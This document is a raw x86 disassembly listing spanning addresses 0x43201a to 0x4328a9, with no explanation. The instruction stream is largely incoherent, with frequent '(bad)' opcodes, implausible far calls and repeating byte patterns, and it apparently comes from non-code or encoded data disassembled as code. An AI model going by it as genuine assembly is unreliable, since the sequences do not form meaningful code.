  43201a:	loop   0x432015
  43201c:	arpl   WORD PTR [edx+0x62],sp
  43201f:	inc    ebp
  432020:	jmp    edx
  432022:	hlt    
  432023:	arpl   WORD PTR [edx+0x62],sp
  432026:	dec    ebp
  432027:	jmp    edx
  432029:	jmp    DWORD PTR [ebx+0x62]
  43202c:	bound  eax,QWORD PTR [ebp-0x1]
  43202f:	loop   0x432052
  432031:	arpl   WORD PTR [edx+0x62],sp
  432034:	sub    bh,bh
  432036:	loop   0x432098
  432038:	arpl   WORD PTR [edx+0x62],sp
  43203b:	inc    ebp
  43203c:	jmp    edx
  43203e:	push   edi
  43203f:	arpl   WORD PTR [edx+0x62],sp
  432042:	adc    al,0xff
  432044:	loop   0x432094
  432046:	arpl   WORD PTR [edx+0x62],sp
  432049:	inc    ebp
  43204a:	jmp    edx
  43204c:	dec    ebp
  43204d:	arpl   WORD PTR [edx+0x62],sp
  432050:	sbb    al,0xd
  432052:	loop   0x4320ce
  432054:	bound  esp,QWORD PTR [edx+0x62]
  432057:	pop    ss
  432058:	loop   0x432007
  43205a:	arpl   WORD PTR [edx+0x62],sp
  43205d:	out    dx,al
  43205e:	aaa    
  43205f:	or     eax,0x6263ade2
  432064:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43206a:	or     eax,0x62624013
  43206f:	(bad)  
  432070:	(bad)  
  432071:	outs   dx,DWORD PTR ds:[esi]
  432072:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432078:	call   0xb85:0x61a8e85e
  43207f:	call   0x63ad:0xe2173ac9
  432086:	bound  esp,QWORD PTR [edx-0x2a]
  432089:	and    ebp,DWORD PTR [ebp+0x14626263]
  43208f:	loop   0x432092
  432091:	imul   esp,edi,0xade20dc0
  432097:	arpl   WORD PTR [edx+0x62],sp
  43209a:	test   DWORD PTR [ebx],ecx
  43209c:	call   0x6320:0x130d3ac9
  4320a3:	bound  esp,QWORD PTR [edx-0x6d]
  4320a6:	push   ds
  4320a7:	outs   dx,BYTE PTR ds:[esi]
  4320a8:	push   0x61a8e85e
  4320ad:	or     eax,0x6263ad13
  4320b2:	(bad)  
  4320b3:	(bad)  
  4320b4:	outs   dx,DWORD PTR ds:[esi]
  4320b5:	or     ebx,DWORD PTR [edx+0x6933ac9]
  4320bb:	adc    BYTE PTR [ebp+0x61a86d29],cl
  4320c1:	(bad)  
  4320c2:	outs   dx,DWORD PTR ds:[esi]
  4320c3:	fsub   DWORD PTR [ecx+0x61]
  4320c6:	popa   
  4320c7:	fcomp  DWORD PTR [edi]
  4320c9:	call   0xe71f:0xa7570693
  4320d0:	mov    cl,BYTE PTR ds:0x62627ae2
  4320d6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320dc:	xor    al,0x5e
  4320de:	call   0xe25a828b
  4320e3:	sbb    al,0x63
  4320e5:	bound  esp,QWORD PTR [edx-0x12]
  4320e8:	xor    al,0xf0
  4320ea:	ins    DWORD PTR es:[edi],dx
  4320eb:	bound  esp,QWORD PTR [edx+0x62]
  4320ee:	or     eax,0x62627ae2
  4320f3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320f9:	xor    al,0x5e
  4320fb:	call   0xe2ea82a8
  432100:	sbb    al,0x63
  432102:	bound  esp,QWORD PTR [edx-0x6d]
  432105:	outs   dx,BYTE PTR ds:[esi]
  432106:	fcomp  QWORD PTR [edi+0x61]
  432109:	popa   
  43210a:	or     eax,0x626320e2
  43210f:	bound  ecx,QWORD PTR ds:0xe2179aa2
  432115:	push   esp
  432116:	arpl   WORD PTR [edx+0x62],sp
  432119:	and    edx,esp
  43211b:	outs   dx,BYTE PTR ds:[esi]
  43211c:	arpl   WORD PTR [edx+0x62],sp
  43211f:	lods   eax,DWORD PTR ds:[esi]
  432120:	loop   0x432123
  432122:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  432128:	bound  ebx,QWORD PTR [edi]
  43212a:	adc    eax,0xe2216901
  43212f:	adc    BYTE PTR [ebx+0x62],ah
  432132:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  432138:	loop   0x432137
  43213a:	arpl   WORD PTR [edx+0x62],sp
  43213d:	and    dl,ah
  43213f:	add    DWORD PTR [ecx+0xd],ebp
  432142:	loop   0x432141
  432144:	arpl   WORD PTR [edx+0x62],sp
  432147:	test   DWORD PTR [ebx],ecx
  432149:	call   0xa8e8:0x5e343ac9
  432150:	popa   
  432151:	ror    BYTE PTR ds:0x626310e2,cl
  432157:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43215d:	xor    al,0x5e
  43215f:	call   0xe15830c
  432164:	loop   0x43214f
  432166:	arpl   WORD PTR [edx+0x62],sp
  432169:	test   DWORD PTR [ebx],ecx
  43216b:	call   0xa8e8:0x5e343ac9
  432172:	popa   
  432173:	ror    BYTE PTR ds:0x62636ee2,cl
  432179:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43217f:	xor    al,0x5e
  432181:	call   0xe15832e
  432186:	jne    0x4321ac
  432188:	or     eax,0x616848db
  43218d:	popa   
  43218e:	(bad)  {k7}
  432193:	add    DWORD PTR [ebx+0x62],esp
  432196:	bound  ecx,QWORD PTR ds:0x6263fde2
  43219c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321a2:	xor    al,0x5e
  4321a4:	call   0xe158351
  4321a9:	loop   0x4321bb
  4321ab:	arpl   WORD PTR [edx+0x62],sp
  4321ae:	test   DWORD PTR [ebx],ecx
  4321b0:	call   0xa8e8:0x5e343ac9
  4321b7:	popa   
  4321b8:	shl    BYTE PTR [edx+0xb],cl
  4321bb:	push   esp
  4321bc:	arpl   WORD PTR [edx+0x62],sp
  4321bf:	or     eax,0x62636ee2
  4321c4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321ca:	xor    al,0x5e
  4321cc:	call   0xe158379
  4321d1:	jne    0x4321f7
  4321d3:	or     eax,0x616848db
  4321d8:	popa   
  4321d9:	(bad)  {k7}
  4321de:	and    al,0x63
  4321e0:	bound  esp,QWORD PTR [edx+0xd]
  4321e3:	loop   0x432253
  4321e5:	arpl   WORD PTR [edx+0x62],sp
  4321e8:	test   DWORD PTR [ebx],ecx
  4321ea:	call   0xa8e8:0x5e343ac9
  4321f1:	popa   
  4321f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321f3:	loop   0x4321f6
  4321f5:	arpl   WORD PTR [edx+0x62],sp
  4321f8:	out    0x8a,eax
  4321fa:	or     eax,0x62636ee2
  4321ff:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432205:	xor    al,0x5e
  432207:	call   0xe2ea83b4
  43220c:	and    al,0x63
  43220e:	bound  esp,QWORD PTR [edx-0x4e]
  432211:	xor    al,0xf0
  432213:	mov    WORD PTR [ebx],?
  432215:	popa   
  432216:	popa   
  432217:	and    edx,esp
  432219:	cmc    
  43221a:	arpl   WORD PTR [edx+0x62],sp
  43221d:	and    esp,edx
  43221f:	add    DWORD PTR [ecx+0x21],ebp
  432222:	loop   0x432230
  432224:	arpl   WORD PTR [edx+0x62],sp
  432227:	mov    bl,0xe2
  432229:	add    DWORD PTR [ecx+0xd],ebp
  43222c:	loop   0x432223
  43222e:	arpl   WORD PTR [edx+0x62],sp
  432231:	test   DWORD PTR [ebx],ecx
  432233:	call   0xa8e8:0x5e343ac9
  43223a:	popa   
  43223b:	or     eax,0x62630113
  432240:	bound  eax,QWORD PTR [eax+ebp*2]
  432243:	or     eax,0x62636ee2
  432248:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43224e:	xor    al,0x5e
  432250:	call   0x135083fd
  432255:	add    DWORD PTR [ebx+0x62],esp
  432258:	bound  eax,QWORD PTR [ecx+ebx*4]
  43225b:	push   0x630ce20d
  432260:	bound  esp,QWORD PTR [edx-0x7b]
  432263:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432269:	call   0x13508416
  43226e:	add    DWORD PTR [ebx+0x62],esp
  432271:	bound  eax,QWORD PTR [ecx+ebx*4]
  432274:	pop    edi
  432275:	fcomp  DWORD PTR [ebx-0x4f]
  432278:	arpl   WORD PTR [edx+0x62],sp
  43227b:	popa   
  43227c:	fcomp  DWORD PTR [ebx-0x25]
  43227f:	arpl   WORD PTR [edx+0x62],sp
  432282:	popa   
  432283:	fcomp  DWORD PTR [ebx+0x4]
  432286:	arpl   WORD PTR [edx+0x62],sp
  432289:	popa   
  43228a:	adc    esp,edx
  43228c:	(bad)  [ebx+0x62]
  43228f:	(bad)  
  432291:	bound  ecx,QWORD PTR [ebx]
  432293:	push   esp
  432294:	arpl   WORD PTR [edx+0x62],sp
  432297:	bound  ecx,QWORD PTR [ebx]
  432299:	and    al,0x63
  43229b:	bound  esp,QWORD PTR [edx+0x13]
  43229e:	loop   0x432251
  4322a0:	arpl   WORD PTR [edx+0x62],sp
  4322a3:	ror    BYTE PTR ds:0x626320e2,cl
  4322a9:	bound  esp,QWORD PTR [edx-0x15]
  4322ac:	xchg   BYTE PTR ds:0x6262cee2,cl
  4322b2:	(bad)  
  4322b3:	fcomp  DWORD PTR [edx+edx*4]
  4322b6:	shl    BYTE PTR [edx+0xb],cl
  4322b9:	add    DWORD PTR [ebx+0x62],esp
  4322bc:	(bad)
  4322c1:	bound  edx,QWORD PTR [edi]
  4322c3:	loop   0x4322c9
  4322c5:	arpl   WORD PTR [edx+0x62],sp
  4322c8:	or     eax,0xb851c75
  4322cd:	call   0xa8e8:0x5e343ac9
  4322d4:	popa   
  4322d5:	ror    BYTE PTR ds:0x62636ee2,cl
  4322db:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4322e1:	xor    al,0x5e
  4322e3:	call   0x63158490
  4322e8:	or     eax,DWORD PTR [ecx]
  4322ea:	arpl   WORD PTR [edx+0x62],sp
  4322ed:	or     eax,0xdb0d2475
  4322f2:	dec    eax
  4322f3:	push   0xd2626161
  4322f8:	mov    cl,BYTE PTR ds:0x626304e2
  4322fe:	bound  esi,QWORD PTR [ebx]
  432300:	pop    esi
  432301:	call   0xbc884ae
  432306:	call   0x1e2:0xad9d3ac9
  43230d:	imul   esi,DWORD PTR [edx+0x1c750dda],0xc99a0b85
  432317:	cmp    dh,BYTE PTR [esi+ebx*2]
  43231a:	call   0xe1584c7
  43231f:	loop   0x43238f
  432321:	arpl   WORD PTR [edx+0x62],sp
  432324:	test   DWORD PTR [ebx],ecx
  432326:	call   0xa8e8:0x5e343ac9
  43232d:	popa   
  43232e:	shl    BYTE PTR [edx+0xb],cl
  432331:	into   
  432332:	bound  esp,QWORD PTR [edx+0x62]
  432335:	or     eax,0xdb0d2475
  43233a:	dec    eax
  43233b:	push   0xd2626161
  432340:	mov    cl,BYTE PTR ds:0x626324e2
  432346:	bound  edx,QWORD PTR [edi]
  432348:	loop   0x432318
  43234a:	bound  esp,QWORD PTR [edx+0x62]
  43234d:	or     eax,0x626354e2
  432352:	bound  edx,QWORD PTR [edi]
  432354:	jne    0x4323b3
  432356:	out    dx,al
  432357:	test   eax,0x851c750d
  43235c:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432362:	call   0xe15850f
  432367:	loop   0x4323d7
  432369:	arpl   WORD PTR [edx+0x62],sp
  43236c:	test   DWORD PTR [ebx],ecx
  43236e:	call   0xa8e8:0x5e343ac9
  432375:	popa   
  432376:	shl    BYTE PTR [edx+0xb],cl
  432379:	and    al,0x63
  43237b:	bound  esp,QWORD PTR [edx+0xd]
  43237e:	jne    0x4323a4
  432380:	or     eax,0x616848db
  432385:	popa   
  432386:	(bad)  
  432388:	mov    cl,BYTE PTR ds:0xe2175d75
  43238e:	pusha  
  43238f:	pop    esp
  432390:	bound  esp,QWORD PTR [edx+0xd]
  432393:	loop   0x432363
  432395:	bound  esp,QWORD PTR [edx+0x62]
  432398:	pop    ss
  432399:	loop   0x4323e7
  43239b:	pop    esp
  43239c:	bound  esp,QWORD PTR [edx+0x21]
  43239f:	loop   0x43241f
  4323a1:	arpl   WORD PTR [edx+0x62],sp
  4323a4:	lods   eax,DWORD PTR ds:[esi]
  4323a5:	loop   0x4323a8
  4323a7:	imul   esp,DWORD PTR [ecx],0x626392e2
  4323ad:	bound  esp,QWORD PTR ds:0xd6901e2
  4323b3:	loop   0x432433
  4323b5:	arpl   WORD PTR [edx+0x62],sp
  4323b8:	test   DWORD PTR [ebx],ecx
  4323ba:	call   0xa8e8:0x5e343ac9
  4323c1:	popa   
  4323c2:	pop    ss
  4323c3:	loop   0x4323c0
  4323c5:	arpl   WORD PTR [edx+0x62],sp
  4323c8:	or     eax,0x62637ee2
  4323cd:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4323d3:	xor    al,0x5e
  4323d5:	call   0xe25a8582
  4323da:	jbe    0x43243f
  4323dc:	bound  esp,QWORD PTR [edx+0x21]
  4323df:	loop   0x43236b
  4323e1:	arpl   WORD PTR [edx+0x62],sp
  4323e4:	or     al,0xe2
  4323e6:	add    DWORD PTR [ecx+0x21],ebp
  4323e9:	loop   0x432371
  4323eb:	arpl   WORD PTR [edx+0x62],sp
  4323ee:	daa    
  4323ef:	loop   0x4323f2
  4323f1:	imul   ecx,DWORD PTR ds:0x625c60e2,0x7e130d62
  4323fb:	arpl   WORD PTR [edx+0x62],sp
  4323fe:	(bad)  
  4323ff:	outs   dx,DWORD PTR ds:[esi]
  432400:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432406:	pop    esi
  432407:	call   0x1fea85b4
  43240c:	xchg   ebx,eax
  43240d:	outs   dx,BYTE PTR ds:[esi]
  43240e:	add    eax,0xd616156
  432413:	loop   0x4323a7
  432415:	arpl   WORD PTR [edx+0x62],sp
  432418:	test   DWORD PTR [ebx],ecx
  43241a:	call   0xa8e8:0x5e343ac9
  432421:	popa   
  432422:	or     eax,0x6263fb13
  432427:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43242d:	xchg   edx,eax
  43242e:	arpl   WORD PTR [edx+0x62],sp
  432431:	test   DWORD PTR [ebx],ecx
  432433:	call   0xa8e8:0x5e343ac9
  43243a:	popa   
  43243b:	or     eax,0x625c60e4
  432440:	bound  ebp,QWORD PTR ds:0x934ea758
  432446:	mov    ah,0xc0
  432448:	push   esi
  432449:	popa   
  43244a:	popa   
  43244b:	or     eax,0x625c60e2
  432450:	bound  ecx,QWORD PTR ds:0x6263fb13
  432456:	bound  ebp,QWORD PTR ds:0x8a130d1f
  43245c:	arpl   WORD PTR [edx+0x62],sp
  43245f:	(bad)  
  432460:	outs   dx,DWORD PTR ds:[esi]
  432461:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432467:	pop    esi
  432468:	call   0x46f28615
  43246d:	dec    edx
  43246e:	outs   dx,DWORD PTR ds:[esi]
  43246f:	pop    ss
  432470:	loop   0x43240c
  432472:	arpl   WORD PTR [edx+0x62],sp
  432475:	or     eax,0x62639ae2
  43247a:	bound  ecx,QWORD PTR ds:0x62638613
  432480:	(bad)  
  432481:	(bad)  
  432482:	outs   dx,DWORD PTR ds:[esi]
  432483:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432489:	pop    esi
  43248a:	call   0x1fea8637
  43248f:	lds    ebp,FWORD PTR [edx+0xd]
  432492:	loop   0x43241a
  432494:	arpl   WORD PTR [edx+0x62],sp
  432497:	test   DWORD PTR [ebx],ecx
  432499:	call   0xa8e8:0x5e343ac9
  4324a0:	popa   
  4324a1:	pop    ss
  4324a2:	loop   0x43243e
  4324a4:	arpl   WORD PTR [edx+0x62],sp
  4324a7:	or     eax,0x62638ae2
  4324ac:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4324b2:	xor    al,0x5e
  4324b4:	call   0x13508661
  4324b9:	call   0x60ba:0x93626263
  4324c0:	pop    ss
  4324c1:	adc    esi,DWORD PTR [esi+0x63]
  4324c4:	bound  esp,QWORD PTR [edx+0xd]
  4324c7:	loop   0x43253f
  4324c9:	arpl   WORD PTR [edx+0x62],sp
  4324cc:	or     eax,0x62637e13
  4324d1:	(bad)  
  4324d2:	(bad)  
  4324d3:	outs   dx,DWORD PTR ds:[esi]
  4324d4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4324da:	pop    esi
  4324db:	call   0x1fea8688
  4324e0:	xchg   ebx,eax
  4324e1:	outs   dx,BYTE PTR ds:[esi]
  4324e2:	add    DWORD PTR [edi+0x61],ebx
  4324e5:	popa   
  4324e6:	or     eax,0x626376e2
  4324eb:	bound  edx,QWORD PTR [edi]
  4324ed:	loop   0x432547
  4324ef:	pop    esp
  4324f0:	bound  esp,QWORD PTR [edx+0xd]
  4324f3:	loop   0x432541
  4324f5:	pop    esp
  4324f6:	bound  esp,QWORD PTR [edx+0x56]
  4324f9:	loop   0x4324f6
  4324fb:	arpl   WORD PTR [edx+0x62],sp
  4324fe:	pop    ss
  4324ff:	loop   0x432529
  432501:	pop    esp
  432502:	bound  esp,QWORD PTR [edx+0x21]
  432505:	loop   0x4324fa
  432507:	pop    esp
  432508:	bound  esp,QWORD PTR [edx-0x53]
  43250b:	loop   0x43250e
  43250d:	imul   esp,DWORD PTR [ecx],0x625c48e2
  432513:	bound  esp,QWORD PTR ds:0x216901e2
  432519:	loop   0x432578
  43251b:	pop    esp
  43251c:	bound  esp,QWORD PTR [edx-0x4d]
  43251f:	loop   0x432522
  432521:	imul   esp,DWORD PTR [ecx],0x625c69e2
  432527:	bound  esp,QWORD PTR [ebx]
  432529:	loop   0x43252c
  43252b:	imul   esp,DWORD PTR [ecx],0x625c55e2
  432531:	bound  esp,QWORD PTR ds:0xd6901e2
  432537:	loop   0x43252c
  432539:	pop    esp
  43253a:	bound  esp,QWORD PTR [edx-0x7b]
  43253d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432543:	call   0xe25a86f0
  432548:	popa   
  432549:	arpl   WORD PTR [edx+0x62],sp
  43254c:	adc    esp,edx
  43254e:	fs pop esp
  432550:	bound  esp,QWORD PTR [edx+0x17]
  432553:	loop   0x43256d
  432555:	pop    esp
  432556:	bound  esp,QWORD PTR [edx+0x13]
  432559:	loop   0x432552
  43255b:	arpl   WORD PTR [edx+0x62],sp
  43255e:	pop    ss
  43255f:	loop   0x432592
  432561:	pop    esp
  432562:	bound  esp,QWORD PTR [edx+0xd]
  432565:	loop   0x4325bf
  432567:	pop    esp
  432568:	bound  esp,QWORD PTR [edx-0x59]
  43256b:	loop   0x4325ce
  43256d:	arpl   WORD PTR [edx+0x62],sp
  432570:	xchg   ebx,eax
  432571:	fdivr  DWORD PTR [ebx+0xd616168]
  432577:	loop   0x432591
  432579:	pop    esp
  43257a:	bound  esp,QWORD PTR [edx+0x21]
  43257d:	popa   
  43257e:	pop    ebx
  43257f:	loop   0x432582
  432581:	imul   ecx,DWORD PTR ds:0x625c31e2,0xb7612162
  43258b:	loop   0x43258e
  43258d:	imul   edx,DWORD PTR [ebx],0x625c49e2
  432593:	bound  edx,QWORD PTR [edi]
  432595:	loop   0x4325e7
  432597:	pop    esp
  432598:	bound  esp,QWORD PTR [edx+0xd]
  43259b:	loop   0x4325f2
  43259d:	pop    esp
  43259e:	bound  esp,QWORD PTR [edx-0x7b]
  4325a1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325a7:	call   0x13508754
  4325ac:	popa   
  4325ad:	arpl   WORD PTR [edx+0x62],sp
  4325b0:	xchg   ebx,eax
  4325b1:	mov    edx,0x50e20d60
  4325b6:	pop    esp
  4325b7:	bound  esp,QWORD PTR [edx+0xd]
  4325ba:	in     al,0x28
  4325bc:	pop    esp
  4325bd:	bound  esp,QWORD PTR [edx+0x1a]
  4325c0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  4325c6:	push   ebp
  4325c7:	pop    esp
  4325c8:	bound  esp,QWORD PTR [edx-0x7b]
  4325cb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325d1:	call   0x1350877e
  4325d6:	popa   
  4325d7:	arpl   WORD PTR [edx+0x62],sp
  4325da:	xchg   ebx,eax
  4325db:	mov    edx,0x5de20d60
  4325e0:	pop    esp
  4325e1:	bound  esp,QWORD PTR [edx-0x7b]
  4325e4:	or     ebx,DWORD PTR [edx-0x1da9c537]
  4325ea:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  4325ee:	xchg   ebx,eax
  4325ef:	push   es
  4325f0:	outs   dx,BYTE PTR ds:[esi]
  4325f1:	call   0x130d:0x61a8e85e
  4325f8:	fs pop esp
  4325fa:	bound  esp,QWORD PTR [edx-0x2a]
  4325fd:	outs   dx,DWORD PTR ds:[esi]
  4325fe:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432604:	call   0x693:0x61a8e85e
  43260b:	adc    ecx,DWORD PTR [ecx+0x5c]
  43260e:	bound  esp,QWORD PTR [edx-0x51]
  432611:	pusha  
  432612:	add    al,0x13
  432614:	dec    ecx
  432615:	pop    esp
  432616:	bound  esp,QWORD PTR [edx+0x1a]
  432619:	loop   0x432664
  43261b:	pop    esp
  43261c:	bound  esp,QWORD PTR [edx+0xd]
  43261f:	adc    edx,DWORD PTR [ebp+0x5c]
  432622:	bound  esp,QWORD PTR [edx-0x2a]
  432625:	outs   dx,DWORD PTR ds:[esi]
  432626:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43262c:	pop    esi
  43262d:	call   0xe45087da
  432632:	popa   
  432633:	arpl   WORD PTR [edx+0x62],sp
  432636:	xchg   ebx,eax
  432637:	mov    edx,0x28130d4f
  43263c:	pop    esp
  43263d:	bound  esp,QWORD PTR [edx+0x4]
  432640:	test   DWORD PTR [ecx+0x5c55e20d],0xb856262
  43264a:	call   0xa8e8:0x5e343ac9
  432651:	popa   
  432652:	or     eax,0x62636113
  432657:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43265d:	push   eax
  43265e:	pop    esp
  43265f:	bound  esp,QWORD PTR [edx+0xd]
  432662:	in     al,0x28
  432664:	pop    esp
  432665:	bound  esp,QWORD PTR [edx+0x1a]
  432668:	xchg   BYTE PTR [eax-0x1df265fc],dl
  43266e:	push   ebp
  43266f:	pop    esp
  432670:	bound  esp,QWORD PTR [edx-0x7b]
  432673:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432679:	call   0x13508826
  43267e:	popa   
  43267f:	arpl   WORD PTR [edx+0x62],sp
  432682:	xchg   ebx,eax
  432683:	mov    edx,0x48e20d60
  432688:	pop    esp
  432689:	bound  esp,QWORD PTR [edx-0x7b]
  43268c:	or     ebx,DWORD PTR [edx-0x1da9c537]
  432692:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  432696:	xchg   ebx,eax
  432697:	push   es
  432698:	outs   dx,BYTE PTR ds:[esi]
  432699:	call   0x130d:0x61a8e85e
  4326a0:	mul    DWORD PTR [ebx+0x62]
  4326a3:	(bad)  
  4326a4:	(bad)  
  4326a5:	outs   dx,DWORD PTR ds:[esi]
  4326a6:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4326ac:	call   0x693:0x61a8e85e
  4326b3:	adc    ecx,DWORD PTR [ecx+0x5c]
  4326b6:	bound  esp,QWORD PTR [edx-0x51]
  4326b9:	pusha  
  4326ba:	add    al,0x13
  4326bc:	dec    ecx
  4326bd:	pop    esp
  4326be:	bound  esp,QWORD PTR [edx+0x1a]
  4326c1:	loop   0x43270c
  4326c3:	pop    esp
  4326c4:	bound  esp,QWORD PTR [edx+0xd]
  4326c7:	adc    edx,DWORD PTR [ebp+0x5c]
  4326ca:	bound  esp,QWORD PTR [edx-0x2a]
  4326cd:	outs   dx,DWORD PTR ds:[esi]
  4326ce:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4326d4:	pop    esi
  4326d5:	call   0xe4508882
  4326da:	popa   
  4326db:	arpl   WORD PTR [edx+0x62],sp
  4326de:	xchg   ebx,eax
  4326df:	mov    edx,0x28130d4f
  4326e4:	pop    esp
  4326e5:	bound  esp,QWORD PTR [edx+0x4]
  4326e8:	test   DWORD PTR [ecx+0x5c48e20d],0xb856262
  4326f2:	call   0xa8e8:0x5e343ac9
  4326f9:	popa   
  4326fa:	or     eax,0x625c6913
  4326ff:	(bad)  
  432700:	(bad)  
  432701:	outs   dx,DWORD PTR ds:[esi]
  432702:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432708:	pop    esi
  432709:	call   0xbad688b6
  43270e:	pop    ds
  43270f:	push   esi
  432710:	loop   0x432773
  432712:	arpl   WORD PTR [edx+0x62],sp
  432715:	pop    ss
  432716:	loop   0x432779
  432718:	arpl   WORD PTR [edx+0x62],sp
  43271b:	lock sub al,0x63
  43271e:	bound  esp,QWORD PTR [edx+0xd]
  432721:	loop   0x4326b5
  432723:	arpl   WORD PTR [edx+0x62],sp
  432726:	test   DWORD PTR [ebx],ecx
  432728:	call   0x5cf3:0x130d3ac9
  43272f:	bound  esp,QWORD PTR [edx-0x2a]
  432732:	outs   dx,DWORD PTR ds:[esi]
  432733:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432739:	pop    esi
  43273a:	call   0xe45088e7
  43273f:	pop    eax
  432740:	pop    esp
  432741:	bound  esp,QWORD PTR [edx+0xd]
  432744:	or     ecx,DWORD PTR [eax+0x5c]
  432747:	bound  esp,QWORD PTR [edx-0x2a]
  43274a:	dec    ebx
  43274b:	or     ebx,DWORD PTR [edx-0x29c537]
  432751:	pop    esi
  432752:	call   0xbad688ff
  432757:	xchg   di,ax
  432759:	outs   dx,DWORD PTR ds:[esi]
  43275a:	adc    ebp,DWORD PTR [esi+0x3b]
  43275d:	pop    esi
  43275e:	call   0x1350890b
  432763:	xchg   edx,eax
  432764:	arpl   WORD PTR [edx+0x62],sp
  432767:	(bad)  
  432768:	outs   dx,DWORD PTR ds:[esi]
  432769:	or     ebx,DWORD PTR [edx+0x13563ac9]
  43276f:	sti    
  432770:	arpl   WORD PTR [edx+0x62],sp
  432773:	adc    ebp,DWORD PTR [esi+0x68]
  432776:	pop    esi
  432777:	call   0xe25a8924
  43277c:	sti    
  43277d:	arpl   WORD PTR [edx+0x62],sp
  432780:	out    dx,al
  432781:	jl     0x432790
  432783:	loop   0x432717
  432785:	arpl   WORD PTR [edx+0x62],sp
  432788:	test   DWORD PTR [ebx],ecx
  43278a:	call   0x63fb:0x130d3ac9
  432791:	bound  esp,QWORD PTR [edx+0x13]
  432794:	outs   dx,BYTE PTR ds:[esi]
  432795:	push   0x61a8e85e
  43279a:	pop    ss
  43279b:	loop   0x432798
  43279d:	arpl   WORD PTR [edx+0x62],sp
  4327a0:	lock jno 0x4327f8
  4327a3:	bound  esp,QWORD PTR [edx+0x62]
  4327a6:	mov    dl,0x24
  4327a8:	or     eax,0xad622475
  4327ad:	dec    esp
  4327ae:	push   0x75136161
  4327b3:	and    dl,dl
  4327b5:	or     eax,0xdb0d2475
  4327ba:	stc    
  4327bb:	push   0x72626161
  4327c0:	or     eax,0xdb0d2475
  4327c5:	sbb    al,0x68
  4327c7:	popa   
  4327c8:	popa   
  4327c9:	bound  esi,QWORD PTR [edx+0x62]
  4327cc:	mov    dl,0x5d
  4327ce:	bound  ecx,QWORD PTR [ebx]
  4327d0:	into   
  4327d1:	bound  esp,QWORD PTR [edx+0x62]
  4327d4:	repz inc edi
  4327d6:	jbe    0x432839
  4327d8:	popa   
  4327d9:	pop    ss
  4327da:	jne    0x4327f0
  4327dc:	or     eax,0x62627ae2
  4327e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4327e7:	xor    al,0x5e
  4327e9:	call   0xe2ea8996
  4327ee:	into   
  4327ef:	bound  esp,QWORD PTR [edx+0x62]
  4327f2:	out    0xa9,eax
  4327f4:	or     eax,0xb851c75
  4327f9:	call   0xa8e8:0x5e343ac9
  432800:	popa   
  432801:	ror    BYTE PTR ds:0x62627ae2,cl
  432807:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43280d:	xor    al,0x5e
  43280f:	call   0x631589bc
  432814:	or     ecx,esi
  432816:	bound  esp,QWORD PTR [edx+0x62]
  432819:	or     eax,0xdb0d2475
  43281e:	dec    eax
  43281f:	push   0xd2626161
  432824:	mov    al,bl
  432826:	mov    esp,0x61f72257
  43282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43282c:	or     eax,0x13c9c964
  432831:	jne    0x432888
  432833:	pop    ss
  432834:	jne    0x43289f
  432836:	or     eax,0x61216975
  43283b:	pushf  
  43283c:	xchg   edi,eax
  43283d:	mov    ah,0x69
  43283f:	(bad)  
  432840:	jmp    0xb269:0xb4979c55
  432847:	mov    WORD PTR ds:0xa2ff9275,cs
  43284d:	call   0xa2ff:0x86750df3
  432854:	push   0x92750d36
  432859:	jmp    DWORD PTR [edx+0x22576434]
  43285f:	xchg   BYTE PTR [ecx-0x5b],ah
  432862:	or     eax,0xfd64d664
  432867:	popa   
  432868:	popa   
  432869:	popa   
  43286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286b:	and    DWORD PTR [ebp+0x8],esi
  43286e:	lods   eax,DWORD PTR ds:[esi]
  43286f:	loop   0x432872
  432871:	imul   esp,DWORD PTR [ecx],0xe2252475
  432877:	add    DWORD PTR [ecx+0xd],ebp
  43287a:	jne    0x4328fa
  43287c:	pop    ss
  43287d:	jne    0x43289b
  43287f:	or     eax,0xdb0d1c75
  432884:	or     al,0x68
  432886:	popa   
  432887:	popa   
  432888:	or     eax,0x170d1ccd
  43288d:	or     al,0x68
  43288f:	popa   
  432890:	popa   
  432891:	or     eax,0x56610d91
  432896:	cdq    
  432897:	xchg   esi,eax
  432898:	pop    ss
  432899:	jne    0x432894
  43289b:	or     eax,0xb850875
  4328a0:	call   0xa8e8:0x5e343ac9
  4328a7:	popa   
  4328a8:	pop    ss
  4328a9:	jne    0x4328ff
